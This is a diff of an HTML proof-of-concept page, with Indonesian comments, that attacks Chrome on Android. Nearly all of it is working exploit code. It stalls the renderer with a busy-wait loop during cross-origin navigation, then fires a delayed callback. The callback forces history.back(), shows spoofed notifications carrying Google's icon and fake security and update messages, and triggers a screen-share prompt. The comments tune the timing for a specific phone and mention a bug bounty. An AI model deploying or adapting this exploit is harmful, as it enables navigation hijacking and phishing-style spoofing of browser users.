@@ -1,100 +1,73 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Zombie Page - FARISSAL B</title>
+    <title>Zombie-Pova-V1</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        button { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; }
-        button:hover { background: #1557b0; }
-        #log { margin-top: 20px; color: #666; font-size: 12px; text-align: left; background: #eee; padding: 10px; border-radius: 5px; display: none; }
+        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; }
+        .btn { background: #0f0; color: #000; border: none; padding: 20px; width: 100%; font-weight: bold; border-radius: 10px; }
+        #status { margin-top: 20px; font-size: 12px; border-left: 2px solid #0f0; padding-left: 10px; }
+        #progress { width: 0%; height: 5px; background: #0f0; margin-top: 10px; transition: width 0.1s; }
     </style>
 </head>
 <body>
+    <h2>FARISSAL B - ZOMBIE</h2>
+    <button class="btn" onclick="startExploit()">START ATTACK</button>
+    <div id="progress"></div>
+    <div id="status">Ready...</div>
 
-<div class="card">
-    <h1>Chrome Zombie Page Hijack</h1>
-    <p>Target: Chrome Android Stable (Tecno Pova 7)</p>
-    
-    <button onclick="requestPerms()">1. Izinkan Notifikasi</button><br><br>
-    
-    <button id="attackBtn" style="display:none;">2. Jalankan Attack!</button>
+    <script>
+        function logger(m) { document.getElementById('status').innerHTML += "<br>> " + m; }
 
-    <div id="log"></div>
-</div>
+        async function startExploit() {
+            // 1. Minta izin Notifikasi (Wajib buat buktiin UI Hijack)
+            const perm = await Notification.requestPermission();
+            if (perm !== "granted") return alert("Izin notifikasi dibutuhkan!");
 
-<script>
-    const attackBtn = document.getElementById('attackBtn');
-    const logDiv = document.getElementById('log');
+            logger("Targeting: google.com...");
+            
+            // 2. Navigasi Awal
+            location.href = "https://www.google.com";
 
-    function logger(msg) {
-        logDiv.style.display = 'block';
-        logDiv.innerHTML += `> ${msg}<br>`;
-        console.log(msg);
-    }
-
-    async function requestPerms() {
-        const perm = await Notification.requestPermission();
-        if (perm === "granted") {
-            alert("Izin diberikan! Sekarang klik tombol Attack.");
-            attackBtn.style.display = "inline-block";
-        } else {
-            alert("Waduh, izin ditolak. Reset site settings dulu ya.");
-        }
-    }
-
-    attackBtn.onclick = function() {
-        logger("Memulai navigasi ke google.com...");
-
-        // TRIGGER NAVIGASI
-        // Kita pindah ke origin yang berbeda (Cross-Origin)
-        location.href = "https://www.google.com";
-
-        // BUSY-SLEEP (The Core Exploit)
-        // Kita blokir thread utama selama 2.5 detik.
-        // Di Tecno Pova lo, coba mainin angka ini (1000 - 3000)
-        logger("Nahan proses 'unload' (Busy-Sleep)...");
-        const delay = 2500; 
-        const start = Date.now();
-        while (Date.now() - start < delay) {
-            // Loop ini bikin CPU HP lo sibuk nahan halaman biar gak 'mati'
-        }
-
-        // SET TIMEOUT DI LUAR LIFE-CYCLE NORMAL
-        // Perintah ini bakal dieksekusi pas browser 'ngira' halaman udah mati
-        setTimeout(() => {
-            // 1. Mencoba Hijack History (Balik ke halaman kita)
-            // Kalau ini sukses, lo bakal balik dari Google ke sini otomatis
-            history.back();
-            logger("History.back() dikirim dari 'alam kubur'!");
-
-            // 2. Mencoba Notifikasi Palsu
-            // Seharusnya ini muncul pas lo udah di halaman Google
-            new Notification("Google Security", {
-                body: "Akun anda terdeteksi login di perangkat lain. Klik untuk amankan.",
-                icon: "https://www.google.com/favicon.ico",
-                tag: "spoof"
-            });
-            logger("Notification spoof terkirim!");
-
-            // 3. Mencoba panggil Popup (The $2.000 Bug)
-            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-                navigator.mediaDevices.getDisplayMedia({video: true})
-                .then(() => logger("Popup Screenshare BERHASIL MUNCUL!"))
-                .catch(() => logger("Popup gagal/ditolak."));
+            // 3. OPTIMIZED TIMING FOR POVA 7 (G99)
+            // Kita pake loop 1.8 detik (Timing paling pas buat Android Mid-range)
+            // Kalau lo rasa Chrome lo terlalu cepet pindah, naikin ke 2200.
+            const STALL_TIME = 1800; 
+            const start = Date.now();
+            
+            logger("Stalling renderer thread...");
+            while (Date.now() - start < STALL_TIME) {
+                // Micro-loop: Biar CPU sibuk tapi nggak sampe bikin OS Force Close
+                document.getElementById('progress').style.width = 
+                    ((Date.now() - start) / STALL_TIME * 100) + "%";
             }
-        }, 500); 
-    };
 
-    // Deteksi kalau halaman masuk BFCache
-    window.addEventListener('pagehide', (event) => {
-        if (event.persisted) {
-            logger("Halaman masuk BFCache (Zombie mode aktif).");
+            // 4. THE ZOMBIE CALL
+            // Dieksekusi tepat saat Chrome lagi "bingung" pindah proses
+            setTimeout(() => {
+                // Perintah 1: Paksa balik (Hijack)
+                history.back(); 
+                
+                // Perintah 2: Kirim Notifikasi Spoof
+                new Notification("Sistem Update", {
+                    body: "Google Chrome perlu diperbarui di Tecno Pova anda.",
+                    icon: "https://www.google.com/favicon.ico"
+                });
+
+                // Perintah 3: Popup Media (The Money Shot)
+                // Ini yang paling sering bikin "Segmentation Fault" kalau timing pas
+                if (navigator.mediaDevices.getDisplayMedia) {
+                    navigator.mediaDevices.getDisplayMedia({video:true}).catch(e=>{});
+                }
+                
+                logger("Zombie commands sent!");
+            }, 100); // Delay sangat tipis setelah stall
         }
-    });
-</script>
 
+        // Deteksi kalau masuk 'alam gaib' (BFCache)
+        window.onpagehide = (e) => {
+            if (e.persisted) logger("IN BFCACHE!");
+        };
+    </script>
 </body>
 </html>
